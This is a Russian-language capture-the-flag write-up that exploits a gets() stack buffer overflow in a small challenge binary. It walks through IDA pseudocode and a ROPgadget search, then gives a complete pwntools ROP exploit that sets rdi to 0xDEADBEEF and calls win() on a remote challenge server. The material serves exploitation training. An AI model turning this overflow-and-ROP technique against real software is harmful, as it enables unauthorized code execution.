Получение флага

Расчехляем ИДУ и получаем псевдокод.

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[8]; // [rsp+8h] [rbp-8h] BYREF

  gets((__int64)v4, (__int64)argv, (__int64)envp);
  return 0;
}

Функция gets считывает данные в буфер v4 длиной 8 байт без проверки границ, что создает уязвимость для переполнения буфера.
Также, среди функций есть win.

int __fastcall win(__int64 a1)
{
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  FILE *stream; // [rsp+78h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  fgets(s, 0x23, stream);
  printf("%i\n", a1);
  if ( a1 != 0xDEADBEEFLL )
    return puts("Bad!");
  puts(s);
  return fflush(_bss_start);
}

Тут читается флаг и проверяется значение какой-то переменной. Если все верно - выводит флаг.

Для начала смотрим стэк main.


Здесь var_8 - это буфер длиной 8 байт (соответствующий v4 в функции main), за ним следует s, еще 8 байт. Адрес возврата находится на вершине стека после v4 и s => чтобы достичь адреса возврата, нам нужно заполнить: 8 байт буфера v4 и 8 байт для s (16 байт).
Теперь получим адрес win.

Остался последний штрих.
Функция win ожидает, что первый аргумент (a1) будет передан через регистр rdi.
Следовательно, чтобы передать значение 0xDEADBEEF в win, нам нужно записать это значение в rdi.

ROPgadget --binary ./out --only "pop|ret"


Получили нужный адрес.
Теперь кратко по шагам:

  1. Заполняем буфер v4 (8 байт) и дополнительное пространство (еще 8 байт) до адреса возврата.
  2. Записываем адрес гаджета pop rdi; ret, чтобы он был выполнен следующим после переполнения.
  3. Записываем значение 0xDEADBEEF, которое будет загружено в rdi
  4. Записываем адрес функции win
from pwn import *  
  
 
win_addr = 0x40117F  
pop_rdi_ret = 0x40117a  
win_arg = 0xDEADBEEF  
  
  
padding = b'A' * 16 
payload = padding + p64(pop_rdi_ret) + p64(win_arg) + p64(win_addr)  
  
  
process = remote('tjc.tf', 31457)  
process.sendline(payload)  
process.interactive()
